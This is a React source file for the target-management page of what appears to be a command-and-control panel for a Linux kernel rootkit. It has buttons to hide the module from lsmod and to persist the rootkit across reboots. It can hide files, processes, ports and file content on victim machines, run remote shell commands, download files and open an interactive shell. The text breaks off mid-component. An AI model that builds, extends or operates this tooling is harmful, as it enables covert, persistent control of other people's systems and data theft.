import { useState, useRef, useEffect, useCallback, forwardRef, useImperativeHandle } from 'react'
import {
  ArrowLeft, RefreshCw, Search, Shield, Network,
  SquareTerminal, Folder, FileText, ChevronRight, LayoutGrid, LayoutList,
  Eye, EyeOff, Loader, Clock, Activity, Radio, Zap, Download, X,
  CheckCircle, AlertCircle,
} from 'lucide-react'
import { Badge, StatusPill } from '../components/Badge'
import { CmdBar } from '../components/CmdBar'
import { EventBadge } from '../components/EventBadge'
import { Th } from '../components/Th'
import { wsUrl } from '../api'

const _cache = new Map()
function useSnapshot(key) {
  const cached = _cache.get(key) || { data: null, time: null }
  const [data, setData] = useState(cached.data)
  const [time, setTime] = useState(cached.time)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)
  const prevKey = useRef(key)
  if (prevKey.current !== key) {
    prevKey.current = key
    const fresh = _cache.get(key) || { data: null, time: null }
    setData(fresh.data)
    setTime(fresh.time)
    setLoading(false)
    setError(null)
  }
  const set = useCallback((d) => {
    const now = new Date()
    _cache.set(key, { data: d, time: now })
    setData(d)
    setTime(now)
    setError(null)
    setLoading(false)
  }, [key])
  const fail = useCallback((e) => { setError(e); setTime(new Date()); setLoading(false) }, [])
  return { data, time, loading, setLoading, error, set, fail }
}

const TABS = [
  { key: 'overview', label: 'Overview' },
  { key: 'files', label: 'Files' },
  { key: 'procs', label: 'Processes' },
  { key: 'ports', label: 'Ports' },
  { key: 'shell', label: 'Shell', icon: SquareTerminal },
  { key: 'log', label: 'Command Log' },
  { key: 'events', label: 'Events' },
]

export function Target({ target: t, log, events, sendCmd, query, execCmd, startDownload, downloads, onBack, renameTarget, refresh }) {
  const [tab, setTab] = useState('overview')
  const [persistPending, setPersistPending] = useState(false)
  const [pingResult, setPingResult] = useState(null)
  const [editing, setEditing] = useState(false)
  const [editVal, setEditVal] = useState('')
  const [shellStatus, setShellStatus] = useState('idle')
  const shellRef = useRef(null)

  useEffect(() => {
    setTab('overview')
    setPingResult(null)
    setEditing(false)
  }, [t?.id])

  if (!t) return (
    <div className="flex items-center justify-center h-full">
      <p className="text-fg-3 font-bold text-lg">Target not found</p>
    </div>
  )

  const targetBusy = Object.values(downloads).some(dl => dl.targetId === t.id && dl.state === 'pending')
  const targetLog = log.filter(l => l.target === t.id)
  const hiddenFiles = t.hidden?.file || []
  const hiddenContent = t.hidden?.content || []
  const hiddenPids = t.hidden?.pid || []
  const hiddenPorts = t.hidden?.port || []
  const tabCounts = {
    overview: null, shell: null,
    files: hiddenFiles.length + hiddenContent.length,
    procs: hiddenPids.length || null,
    ports: hiddenPorts.length || null,
    log: targetLog.length,
    events: events.length,
  }

  const cmd = (command) => sendCmd(command, t.id)
  const toggleHide = () => cmd(t.module_hidden ? 'UNHIDE MODULE' : 'HIDE MODULE')
  const togglePersist = () => {
    setPersistPending(true)
    query(t.persisted ? 'UNPERSIST' : 'PERSIST', t.id).then(() => setPersistPending(false))
  }

  return (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="flex items-center gap-3 px-5 py-2.5 border-b-2 border-border bg-secondary">
        <button className="nb-btn p-1.5 shrink-0" onClick={onBack}>
          <ArrowLeft size={16} />
        </button>
        <div className="min-w-0 mr-1">
          {editing ? (
            <form className="flex items-center gap-1" onSubmit={e => {
              e.preventDefault()
              const v = editVal.trim()
              if (v && v !== t.label) renameTarget?.(t.id, v)
              setEditing(false)
            }}>
              <input className="text-lg font-bold bg-bg border-b-2 border-main outline-none px-0 py-0 w-48"
                autoFocus value={editVal}
                onChange={e => setEditVal(e.target.value)}
                onBlur={() => setEditing(false)}
                onKeyDown={e => e.key === 'Escape' && setEditing(false)}
              />
            </form>
          ) : (
            <h1 className="text-lg font-bold truncate leading-tight cursor-pointer hover:text-main transition-colors"
              onClick={() => { setEditVal(t.label || t.hostname || t.id); setEditing(true) }}
              title="Click to rename"
            >{t.label || (t.hostname && t.hostname !== '(none)' ? t.hostname : t.id)}</h1>
          )}
          <div className="text-[10px] font-mono text-fg-3 truncate">{t.id} / {t.kernel} {t.arch} / {t.peer || '--'}</div>
        </div>
        <Badge label={t.online ? 'Online' : 'Offline'} color={t.online ? 'green' : 'red'} />

        <div className="ml-auto flex items-center gap-2 shrink-0">
          <button
            className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5 ${t.module_hidden ? 'nb-btn-main' : ''}`}
            onClick={toggleHide}
            disabled={!t.online || targetBusy}
            title={t.module_hidden ? 'Module hidden from lsmod' : 'Module visible in lsmod'}
          >
            {t.module_hidden ? <EyeOff size={14} /> : <Eye size={14} />}
            {t.module_hidden ? 'Hidden' : 'Visible'}
          </button>
          <button
            className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5 ${t.persisted ? 'nb-btn-main' : ''}`}
            onClick={togglePersist}
            disabled={!t.online || persistPending || targetBusy}
            title={t.persisted ? 'Rootkit persisted to disk, survives reboot' : 'Rootkit in memory only, lost on reboot'}
          >
            {persistPending ? <Loader size={14} className="animate-spin" /> : <Shield size={14} />}
            {t.persisted ? 'Persist On' : 'Persist Off'}
          </button>
          <button className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5
            ${pingResult && pingResult !== '...' && pingResult !== 'FAIL' ? 'nb-btn-main' : pingResult === 'FAIL' ? '!bg-red !text-white !border-border' : ''}`}
            disabled={targetBusy}
            onClick={() => {
              setPingResult('...')
              const t0 = performance.now()
              query('PING', t.id).then(r => {
                const ms = Math.round(performance.now() - t0)
                setPingResult(r?.ok ? `${ms}ms` : 'FAIL')
                setTimeout(() => setPingResult(null), 3000)
              })
            }}>
            <RefreshCw size={14} className={pingResult === '...' ? 'animate-spin' : ''} />
            {pingResult === '...' ? 'Pinging...' : pingResult === 'FAIL' ? 'Failed' : pingResult ? `Pong ${pingResult}` : 'Ping'}
          </button>
        </div>
      </div>

      {/* Busy banner */}
      {targetBusy && (
        <div className="flex items-center gap-2 px-4 py-1.5 bg-amber/15 border-b-2 border-amber/30">
          <Loader size={12} className="animate-spin text-amber shrink-0" />
          <span className="text-xs font-bold text-amber">Download in progress. Commands are blocked until it completes.</span>
        </div>
      )}

      {/* Tabs */}
      <div className="flex border-b-2 border-border bg-secondary overflow-x-auto">
        {TABS.map(({ key, label, icon: TabIcon }) => (
          <button
            key={key}
            className={`px-4 py-2.5 text-sm font-bold whitespace-nowrap flex items-center gap-2 border-r border-border transition-colors shrink-0
              ${tab === key ? 'bg-main text-main-fg' : 'hover:bg-bg-2'}`}
            onClick={() => setTab(key)}
          >
            {TabIcon && <TabIcon size={14} />}
            {label}
            {key === 'shell' && shellStatus === 'connected' && (
              <span className="w-2 h-2 rounded-full bg-green pulse shrink-0" />
            )}
            {tabCounts[key] !== null && tabCounts[key] > 0 && (
              <span className={`text-xs px-1.5 py-0.5 font-mono rounded-[var(--radius)] border-2 border-border
                ${tab === key ? 'bg-secondary text-fg' : 'bg-bg-2'}`}>
                {tabCounts[key]}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* Busy banner */}
      {targetBusy && (
        <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-amber/40 bg-amber/10">
          <Loader size={12} className="animate-spin text-amber shrink-0" />
          <span className="text-xs font-bold text-amber">Download in progress. Commands are blocked until it completes.</span>
        </div>
      )}

      {/* Content */}
      <div className="flex-1 overflow-auto min-h-0 relative">
        {tab === 'overview' && <OverviewTab target={t} cmd={cmd} busy={targetBusy} />}
        {tab === 'files' && <FilesTab target={t} cmd={cmd} query={query} execCmd={execCmd} startDownload={startDownload} downloads={downloads} busy={targetBusy} />}
        {tab === 'procs' && <ProcsTab target={t} cmd={cmd} query={query} execCmd={execCmd} busy={targetBusy} />}
        {tab === 'ports' && <PortsTab target={t} cmd={cmd} execCmd={execCmd} busy={targetBusy} />}
        <div className={`flex flex-col h-full ${tab === 'shell' ? '' : 'hidden'}`}>
          <ShellTab ref={shellRef} target={t} onStatusChange={setShellStatus} visible={tab === 'shell'} />
        </div>
        {tab === 'log' && <LogTab entries={targetLog} />}
        {tab === 'events' && <EventsTab events={events} />}

        {/* Shell alive island */}
        {tab !== 'shell' && shellStatus === 'connected' && (
          <div className="absolute bottom-3 left-3 flex items-center gap-2 px-3 py-2 rounded-[var(--radius)] border-2 border-border bg-bg shadow-[3px_3px_0px_0px_var(--color-border)] cursor-pointer transition-transform hover:translate-y-[-1px] z-10"
            onClick={() => setTab('shell')}
          >
            <span className="w-2 h-2 rounded-full bg-green pulse shrink-0" />
            <SquareTerminal size={13} className="text-fg-2" />
            <span className="text-xs font-bold text-fg-2">Shell active</span>
            <button
              className="ml-1 p-0.5 rounded hover:bg-bg-2 text-fg-3 hover:text-fg transition-colors"
              onClick={e => { e.stopPropagation(); shellRef.current?.disconnect() }}
              title="Close shell session"
            >
              <X size={12} />
            </button>
          </div>
        )}
      </div>

      <CmdBar onSend={cmd} query={query} targetId={t.id} busy={targetBusy} />
    </div>
  )
}

/* -- Overview ------------------------------------------------ */

function OverviewTab({ target: t, cmd, busy }) {
  const hidden = {
    file: (t.hidden?.file || []).length,
    pid: (t.hidden?.pid || []).length,
    port: (t.hidden?.port || []).length,
    content: (t.hidden?.content || []).length,
  }
  const total = hidden.file + hidden.pid + hidden.port + hidden.content

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-0 h-full">
      {/* Col 1: hidden items */}
      <div className="border-b-2 lg:border-b-0 lg:border-r-2 border-border p-5 overflow-auto">
        <Section title={<>Hidden <span className="nb-badge bg-main text-main-fg ml-1">{total}</span></>}>
          {total > 0 && (
            <button className="nb-btn px-3 py-1.5 text-xs text-red mb-3" onClick={() => cmd('UNHIDE ALL')} disabled={!t.online || busy}>
              Unhide All
            </button>
          )}
          {total === 0 && (
            <div className="text-sm text-fg-3 py-4">Nothing hidden yet. Use the Processes, Ports, or Files tabs to hide items.</div>
          )}
          {[
            { key: 'file', label: 'Files', icon: FileText, items: t.hidden?.file || [], unhidCmd: 'UNHIDE FILE' },
            { key: 'pid', label: 'PIDs', icon: Activity, items: t.hidden?.pid || [], unhidCmd: 'UNHIDE PID' },
            { key: 'port', label: 'Ports', icon: Network, items: t.hidden?.port || [], unhidCmd: 'UNHIDE PORT' },
            { key: 'content', label: 'Content', icon: Search, items: t.hidden?.content || [], unhidCmd: 'UNHIDE CONTENT' },
          ].filter(c => c.items.length > 0).map(cat => (
            <div key={cat.key} className="mb-3">
              <div className="flex items-center gap-1.5 mb-1.5">
                <cat.icon size={12} className="text-fg-3" />
                <span className="text-[10px] font-bold uppercase tracking-widest text-fg-3">{cat.label}</span>
                <span className="text-[10px] font-mono text-fg-3">{cat.items.length}</span>
              </div>
              <div className="space-y-0.5">
                {cat.items.map((item, i) => (
                  <div key={i} className="flex items-center justify-between gap-2 px-3 py-1.5 rounded-[var(--radius)] bg-secondary border border-border group">
                    <span className="font-mono text-xs truncate">{item}</span>
                    <button
                      className="p-0.5 text-fg-3 hover:text-red opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                      title={`Unhide ${item}`}
                      onClick={() => cmd(`${cat.unhidCmd} ${i}`)}
                      disabled={!t.online || busy}
                    >
                      <Eye size={12} />
                    </button>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </Section>
      </div>

      {/* Col 3: system info */}
      <div className="p-5 overflow-auto">
        <Section title="System">
          <div className="nb-card-flat overflow-hidden">
            <InfoRow label="Hostname" value={t.hostname || t.id} />
            <InfoRow label="ID" value={t.id} />
            <InfoRow label="Kernel" value={`${t.kernel} ${t.arch}`} />
            {t.build_id && <InfoRow label="Build" value={t.build_id} />}
            {t.peer && <InfoRow label="Peer" value={t.peer} />}
            <InfoRow label="Module" value={t.module_hidden ? 'Hidden' : 'Visible'} color={t.module_hidden ? 'text-green' : 'text-amber'} />
            <InfoRow label="Status" value={t.online ? 'Online' : 'Offline'} color={t.online ? 'text-green' : 'text-red'} />
            <InfoRow label="Hidden" value={`${total} items`} />
          </div>
        </Section>
      </div>
    </div>
  )
}

function Section({ title, children }) {
  return (
    <div>
      <h3 className="text-xs font-bold uppercase tracking-widest text-fg-3 mb-3">{title}</h3>
      {children}
    </div>
  )
}

function InfoRow({ label, value, color }) {
  return (
    <div className="flex items-center justify-between px-4 py-2.5 border-b-2 border-border last:border-b-0">
      <span className="text-xs font-bold uppercase tracking-wider text-fg-3">{label}</span>
      <span className={`font-mono text-sm ${color || ''}`}>{value}</span>
    </div>
  )
}

/* -- File Browser -------------------------------------------- */

function resolvePath(input, cwd) {
  if (!input.startsWith('/')) input = cwd + (cwd === '/' ? '' : '/') + input
  const parts = input.split('/').filter(Boolean)
  const resolved = []
  for (const p of parts) {
    if (p === '.') continue
    if (p === '..') { resolved.pop(); continue }
    resolved.push(p)
  }
  return '/' + resolved.join('/')
}

function formatSize(bytes) {
  if (bytes === 0) return '0'
  if (bytes < 1024) return bytes + ' B'
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' K'
  return (bytes / 1048576).toFixed(1) + ' M'
}

const MAGIC = [
  [[0x7f, 0x45, 0x4c, 0x46], (r) => {
    const bits = r[4] === 2 ? '64-bit' : '32-bit'
    const endian = r[5] === 1 ? 'LSB' : 'MSB'
    const types = { 1: 'relocatable', 2: 'executable', 3: 'shared object', 4: 'core dump' }
    const t = types[r[16] | (r[5] === 1 ? r[17] << 8 : r[16] << 8 | r[17])] || 'unknown'
    const machines = { 3: 'x86', 0x3e: 'x86-64', 0x28: 'ARM', 0xb7: 'AArch64', 0xf3: 'RISC-V' }
    const m = machines[r[18] | (r[5] === 1 ? r[19] << 8 : r[18] << 8 | r[19])] || `arch ${r[18]}`
    return `ELF ${bits} ${endian} ${t}, ${m}`
  }],
  [[0x1f, 0x8b], () => 'gzip compressed data'],
  [[0x42, 0x5a, 0x68], () => 'bzip2 compressed data'],
  [[0xfd, 0x37, 0x7a, 0x58, 0x5a], () => 'xz compressed data'],
  [[0x50, 0x4b, 0x03, 0x04], () => 'Zip archive'],
  [[0x89, 0x50, 0x4e, 0x47], () => 'PNG image'],
  [[0xff, 0xd8, 0xff], () => 'JPEG image'],
  [[0x25, 0x50, 0x44, 0x46], () => 'PDF document'],
  [[0x23, 0x21], (r) => {
    const line = new TextDecoder('ascii', { fatal: false }).decode(r.slice(0, Math.min(128, r.indexOf(0x0a) + 1 || 128)))
    return `script, ${line.trim()}`
  }],
  [[0xce, 0xfa, 0xed, 0xfe], () => 'Mach-O executable (32-bit)'],
  [[0xcf, 0xfa, 0xed, 0xfe], () => 'Mach-O executable (64-bit)'],
  [[0x7f, 0x45, 0x4c, 0x46], () => 'ELF'],
]

function identifyFile(raw, path) {
  const name = path?.split('/').pop() || ''
  const ext = name.includes('.') ? name.split('.').pop().toLowerCase() : ''
  let fileType = 'data'
  for (const [magic, detect] of MAGIC) {
    if (raw.length >= magic.length && magic.every((b, i) => raw[i] === b)) {
      fileType = detect(raw)
      break
    }
  }
  if (fileType === 'data' && ext === 'ko') fileType = 'Linux kernel module'
  if (fileType === 'data' && ext === 'so') fileType = 'shared library'
  if (fileType === 'data' && ext === 'a') fileType = 'static library (archive)'
  const lines = [`${name}: ${fileType}`, `Size: ${formatSize(raw.length)} (${raw.length.toLocaleString()} bytes)`]
  const printable = Array.from(raw.slice(0, 256)).filter(b => b >= 0x20 && b <= 0x7e).length
  lines.push(`Content: ${Math.round(printable / Math.min(raw.length, 256) * 100)}% printable ASCII`)
  if (raw.length >= 16) {
    const head = Array.from(raw.slice(0, 16)).map(b => b.toString(16).padStart(2, '0')).join(' ')
    lines.push(`Magic: ${head}`)
  }
  return lines.join('\n')
}

function formatPreview(raw, path) {
  try {
    const text = new TextDecoder('utf-8', { fatal: true }).decode(raw)
    if (text.includes('\0')) return { type: 'binary', content: identifyFile(raw, path) }
    return { type: 'text', content: text }
  } catch {
    return { type: 'binary', content: identifyFile(raw, path) }
  }
}

function parseShellLs(output) {
  if (!output) return []
  return output.split('\n').filter(line => line && !line.startsWith('total ')).map(line => {
    const parts = line.split(/\s+/)
    if (parts.length < 6) return null
    const perms = parts[0]
    if (!/^[dlcbsp-]/.test(perms)) return null
    const size = parseInt(parts[4], 10) || 0
    // busybox ls -la may have fewer columns than coreutils
    const nameIdx = parts.findIndex((p, i) => i >= 5 && /^\d{1,2}:\d{2}$/.test(p))
    const name = (nameIdx >= 0 ? parts.slice(nameIdx + 1) : parts.slice(8)).join(' ').trim()
    if (!name || name === '.' || name === '..') return null
    return { name, type: perms[0] === 'd' ? 'd' : perms[0] === 'l' ? 'l' : 'f', size, perms }
  }).filter(Boolean)
}

function PreviewPanel({ preview, onClose, onHideContent, onHideFile, online }) {
  const [sel, setSel] = useState('')
  const onMouseUp = () => {
    const s = window.getSelection()?.toString().trim()
    setSel(s || '')
  }
  const fname = preview.path.split('/').pop()
  return (
    <div className="w-1/2 flex flex-col bg-secondary min-w-0">
      <div className="flex items-center justify-between px-4 py-2.5 border-b-2 border-border bg-bg-2 shrink-0">
        <div className="flex items-center gap-2 min-w-0">
          <FileText size={14} className="text-fg-3 shrink-0" />
          <span className="font-mono text-xs text-fg-2 font-bold truncate">{fname}</span>
          <span className="font-mono text-[10px] text-fg-3 shrink-0">{formatSize(preview.size)}</span>
        </div>
        <div className="flex items-center gap-1.5 shrink-0">
          <button className="nb-btn px-2.5 py-1 text-[11px] flex items-center gap-1.5"
            title="Hide this file"
            onClick={onHideFile}
            disabled={!online}
          >
            <Shield size={11} /> Hide File
          </button>
          <button className="nb-btn px-2.5 py-1 text-[11px] flex items-center gap-1.5" onClick={() => {
            if (preview.raw) {
              const blob = new Blob([preview.raw], { type: 'application/octet-stream' })
              const url = URL.createObjectURL(blob)
              const a = document.createElement('a')
              a.href = url
              a.download = fname || 'download'
              a.click()
              setTimeout(() => URL.revokeObjectURL(url), 1000)
            }
          }}>
            <Download size={11} /> Save
          </button>
          <button className="nb-btn p-1" onClick={onClose}>
            <X size={12} />
          </button>
        </div>
      </div>
      {sel && (() => {
        const patterns = sel.split('\n').map(l => l.trim()).filter(Boolean)
        if (!patterns.length) return null
        const multi = patterns.length > 1
        return (
          <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-border bg-amber/10 min-w-0">
            <div className="flex flex-col gap-0.5 min-w-0 flex-1">
              <span className="text-[11px] font-bold text-fg-2">
                {multi ? `${patterns.length} patterns to hide` : 'Pattern to hide'}
              </span>
              <code className="text-[10px] font-mono text-fg-3 truncate block">
                {multi ? patterns.map(p => `"${p.length > 25 ? p.slice(0, 25) + '...' : p}"`).join(', ') : `"${patterns[0]}"`}
              </code>
              {multi && <span className="text-[10px] text-fg-3">Lines containing any of these patterns will be hidden from read()</span>}
            </div>
            <button
              className="nb-btn-main px-2.5 py-1 text-[11px] flex items-center gap-1 shrink-0"
              onClick={() => { onHideContent(sel); setSel('') }}
              disabled={!online}
            >
              <Shield size={10} /> Hide {multi ? `${patterns.length} Patterns` : 'Pattern'}
            </button>
          </div>
        )
      })()}
      <pre className="px-4 py-3 text-xs font-mono text-fg-2 whitespace-pre-wrap break-all overflow-auto flex-1" onMouseUp={onMouseUp}>{preview.content}</pre>
    </div>
  )
}

function FilesTab({ target: t, cmd, query, execCmd, startDownload, downloads, busy }) {
  const [cwd, setCwd] = useState('/')
  const [pathInput, setPathInput] = useState('/')
  const [pathEditing, setPathEditing] = useState(false)
  const [pathError, setPathError] = useState(false)
  const [selected, setSelected] = useState(null)
  const [panel, setPanel] = useState('explorer')
  const [view, setView] = useState('list')
  const [preview, setPreview] = useState(null)

  const doPreview = useCallback((path) => {
    if (!startDownload) return
    startDownload(path, t.id).then(r => {
      if (r.ok) {
        const { type, content } = formatPreview(r.raw, path)
        setPreview({ path, content, type, size: r.size, raw: r.raw })
      }
    })
  }, [startDownload])
  const snap = useSnapshot(`files:${t.id}:${cwd}`)
  const hiddenFiles = t.hidden?.file || []
  const hiddenContent = t.hidden?.content || []

  const cwdRef = useRef(cwd)
  cwdRef.current = cwd
  const pendingNav = useRef(null)
  const fetchDir = useCallback((path, force) => {
    const key = `files:${t.id}:${path}`
    if (!force) {
      const cached = _cache.get(key)
      if (cached?.data) return
    }
    snap.setLoading(true)
    const attempt = (retries) => {
      execCmd(`ls -la --color=never ${path}`, t.id).then(result => {
        if (path !== cwdRef.current) return
        if (result.ok) {
          snap.set(parseShellLs(result.output))
        } else if (retries > 0 && (result.output || '').includes('busy')) {
          setTimeout(() => attempt(retries - 1), 300)
        } else {
          snap.fail(result.output || 'failed')
        }
      })
    }
    attempt(3)
  }, [execCmd, t.id, snap])

  useEffect(() => { pendingNav.current = null; fetchDir(cwd) }, [cwd, fetchDir])

  const navigateTo = (path, force) => {
    const base = pendingNav.current || cwd
    const resolved = resolvePath(path, base)
    if (resolved === base && !force) return
    setSelected(null)
    setPreview(null)
    if (resolved === cwd && force) {
      fetchDir(cwd, true)
      return
    }
    pendingNav.current = resolved
    setCwd(resolved)
    setPathInput(resolved)
    setPathError(false)
  }

  const submitPath = (e) => {
    e.preventDefault()
    const resolved = resolvePath(pathInput, cwd)
    setCwd(resolved)
    setPathInput(resolved)
    setPathEditing(false)
  }

  const isHidden = (name) => {
    const full = cwd === '/' ? `/${name}` : `${cwd}/${name}`
    return hiddenFiles.some(h => h === name || h === full || full.endsWith(`/${h}`))
      || hiddenContent.some(pattern => name.includes(pattern))
  }

  const breadcrumbs = cwd === '/' ? ['/'] : ['/', ...cwd.split('/').filter(Boolean)]

  const sorted = [...(snap.data || [])].sort((a, b) => {
    if (a.type === 'd' && b.type !== 'd') return -1
    if (a.type !== 'd' && b.type === 'd') return 1
    return a.name.localeCompare(b.name)
  })

  return (
    <div className="flex flex-col h-full">
      {/* Toolbar */}
      <div className="flex items-center gap-2 px-3 py-2.5 border-b-2 border-border bg-secondary">
        <button className="nb-btn p-1.5" onClick={() => navigateTo('..', true)} disabled={cwd === '/'} title="Parent directory">
          <ArrowLeft size={16} />
        </button>
        <button className="nb-btn p-1.5" onClick={() => fetchDir(cwd, true)} title="Refresh">
          <RefreshCw size={16} className={snap.loading ? 'animate-spin' : ''} />
        </button>

        {/* Breadcrumb / path input */}
        <div className="flex-1 min-w-0 border-2 border-border rounded-[var(--radius)] bg-bg overflow-hidden">
          {pathEditing ? (
            <form onSubmit={submitPath}>
              <input
                className="w-full font-mono text-sm px-3 py-1.5 bg-secondary outline-none"
                value={pathInput}
                onChange={e => setPathInput(e.target.value)}
                onBlur={() => { setPathInput(cwd); setPathError(false); setPathEditing(false) }}
                onKeyDown={e => { if (e.key === 'Escape') { setPathInput(cwd); setPathEditing(false) } }}
                spellCheck={false}
                autoFocus
              />
            </form>
          ) : (
            <div
              className="flex items-center px-1 py-1 cursor-text overflow-x-auto"
              style={{ scrollbarWidth: 'none' }}
              onClick={() => setPathEditing(true)}
            >
              {breadcrumbs.map((seg, i) => {
                const path = i === 0 ? '/' : '/' + breadcrumbs.slice(1, i + 1).join('/')
                const isLast = i === breadcrumbs.length - 1
                return (
                  <span key={i} className="flex items-center shrink-0">
                    {i > 0 && (
                      <svg width="14" height="14" viewBox="0 0 14 14" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" className="text-fg-3 mx-0.5"><path d="M5 3l4 4-4 4"/></svg>
                    )}
                    <button
                      className={`px-1.5 py-0.5 rounded-[3px] font-mono text-sm transition-colors
                        ${isLast ? 'font-bold text-fg bg-main/10' : 'text-fg-2 hover:bg-main/15 hover:text-fg'}`}
                      onClick={e => { e.stopPropagation(); navigateTo(path, true) }}
                    >
                      {i === 0 ? '/' : seg}
                    </button>
                  </span>
                )
              })}
            </div>
          )}
        </div>

        {/* View toggle */}
        <button className="nb-btn p-1.5" onClick={() => setView(v => v === 'list' ? 'grid' : 'list')} title={view === 'list' ? 'Grid view' : 'List view'}>
          {view === 'list' ? <LayoutGrid size={16} /> : <LayoutList size={16} />}
        </button>

        {/* Panel toggle */}
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0 shadow-[2px_2px_0px_0px_var(--color-border)]">
          <button
            className={`px-3 py-1.5 text-xs font-bold transition-colors ${panel === 'explorer' ? 'bg-main text-main-fg' : 'bg-secondary hover:bg-bg'}`}
            onClick={() => setPanel('explorer')}
          >
            Files
          </button>
          <button
            className={`px-3 py-1.5 text-xs font-bold border-l-2 border-border transition-colors ${panel === 'hidden' ? 'bg-main text-main-fg' : 'bg-secondary hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >
            Hidden{(hiddenFiles.length + hiddenContent.length) > 0 && ` (${hiddenFiles.length + hiddenContent.length})`}
          </button>
        </div>
      </div>

      {panel === 'explorer' ? (
        <>
          <div className="flex flex-1 min-h-0">
            {/* File listing side */}
            <div className={`flex flex-col min-w-0 ${preview ? 'w-1/2 border-r-2 border-border' : 'flex-1'}`}>
              {/* Column headers (list view only) */}
              {view === 'list' && (
                <div className="grid grid-cols-[1fr_80px_64px] px-4 py-2 border-b-2 border-border bg-bg-2">
                  <span className="text-[11px] font-bold uppercase tracking-widest text-fg-3">Name</span>
                  <span className="text-[11px] font-bold uppercase tracking-widest text-fg-3 text-right">Size</span>
                  <span></span>
                </div>
              )}

              <div className="flex-1 overflow-auto">
                {snap.loading && !snap.data ? (
                  <div className="flex flex-col items-center justify-center gap-3 p-12 text-fg-3">
                    <Loader size={20} className="animate-spin" />
                    <span className="text-sm font-bold">Reading directory...</span>
                  </div>
                ) : snap.error ? (
                  <div className="flex flex-col items-center justify-center gap-3 p-12">
                    <div className="nb-badge bg-red text-white">Error</div>
                    <div className="text-sm text-fg-3 font-mono text-center max-w-xs">{snap.error}</div>
                    <button className="nb-btn px-4 py-1.5 text-xs" onClick={() => fetchDir(cwd, true)}>
                      <RefreshCw size={12} className="inline mr-1.5" />Retry
                    </button>
                  </div>
                ) : sorted.length ? (
                  view === 'list' ? sorted.map(entry => {
                    const h = isHidden(entry.name)
                    const isDir = entry.type === 'd'
                    const isLink = entry.type === 'l'
                    const sel = selected === entry.name
                    const fullPath = cwd === '/' ? `/${entry.name}` : `${cwd}/${entry.name}`
                    const dl = downloads[`${t.id}\0${fullPath}`]
                    const pending = dl?.state === 'pending'
                    const done = dl?.state === 'done'
                    const pct = pending && dl.total ? Math.round(dl.received * 100 / dl.total) : 0
                    return (
                      <div
                        key={entry.name}
                        className={`grid grid-cols-[1fr_80px_64px] px-4 py-2 border-b border-border/50 cursor-pointer transition-all group
                          ${sel ? 'bg-main/12 shadow-[inset_3px_0_0_var(--color-main)]' : 'hover:bg-bg-2 hover:shadow-[inset_3px_0_0_var(--color-fg-3)]'}
                          ${h ? 'opacity-30' : ''}`}
                        onClick={() => {
                          if (isDir) { navigateTo(entry.name) }
                          else if (sel) { setSelected(null); setPreview(null) }
                          else { setSelected(entry.name); doPreview(fullPath) }
                        }}
                      >
                        <div className="flex items-center gap-2.5 min-w-0">
                          {isDir
                            ? <Folder size={16} className="text-amber shrink-0" />
                            : isLink
                              ? <FileText size={16} className="text-blue shrink-0" />
                              : <FileText size={16} className="text-fg-3 shrink-0" />}
                          <span className={`font-mono text-sm truncate ${isDir ? 'font-bold' : ''} ${isLink ? 'italic text-fg-2' : ''}`}>
                            {entry.name}
                          </span>
                          {h && <span className="nb-badge bg-red text-white text-[9px] py-0 px-1.5 shrink-0">hidden</span>}
                        </div>
                        <span className="font-mono text-xs text-fg-3 self-center text-right tabular-nums">
                          {isDir ? '' : formatSize(entry.size)}
                        </span>
                        <div className="flex items-center justify-end gap-1 self-center">
                          {!isDir && (
                            <>
                              <button
                                className={`nb-btn p-1 text-xs transition-all
                                  ${pending ? '!bg-main !text-main-fg' : done ? '!bg-green !text-white' : 'opacity-0 group-hover:opacity-100'}`}
                                title={pending && dl.total ? `${pct}%` : 'Preview'}
                                onClick={e => { e.stopPropagation(); doPreview(fullPath) }}
                                disabled={pending}
                              >
                                {pending
                                  ? (dl.total
                                    ? <span className="text-[10px] font-mono font-bold tabular-nums w-7 text-center">{pct}%</span>
                                    : <Loader size={12} className="animate-spin" />)
                                  : done
                                    ? <svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><path d="M2.5 6l2.5 3 4.5-5.5"/></svg>
                                    : <Eye size={12} />}
                              </button>
                              <button
                                className={`nb-btn p-1 text-xs transition-all ${h ? '!bg-green !text-white' : 'opacity-0 group-hover:opacity-100'}`}
                                title={h ? `Unhide ${entry.name}` : `Hide ${entry.name}`}
                                onClick={e => { e.stopPropagation(); cmd(h ? `UNHIDE FILE ${entry.name}` : `HIDE FILE ${entry.name}`) }}
                                disabled={!t.online || busy}
                              >
                                <Shield size={12} />
                              </button>
                            </>
                          )}
                          {isDir && (
                            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" className="text-fg-3 opacity-0 group-hover:opacity-60"><path d="M5 3l4 4-4 4"/></svg>
                          )}
                        </div>
                      </div>
                    )
                  }) : (
                    /* Grid view */
                    <div className="grid grid-cols-[repeat(auto-fill,minmax(100px,1fr))] gap-3 p-4">
                      {sorted.map(entry => {
                        const h = isHidden(entry.name)
                        const isDir = entry.type === 'd'
                        const isLink = entry.type === 'l'
                        const sel = selected === entry.name
                        const fullPath = cwd === '/' ? `/${entry.name}` : `${cwd}/${entry.name}`
                        return (
                          <div
                            key={entry.name}
                            className={`flex flex-col items-center gap-1.5 p-3 rounded-[var(--radius)] border-2 cursor-pointer transition-all group
                              ${sel
                                ? 'border-main bg-main/10 shadow-[var(--shadow-offset)_var(--shadow-offset)_0px_0px_var(--color-main)]'
                                : 'border-border bg-secondary hover:shadow-[var(--shadow-offset)_var(--shadow-offset)_0px_0px_var(--color-border)] hover:translate-x-[-1px] hover:translate-y-[-1px]'}
                              ${h ? 'opacity-30' : ''}`}
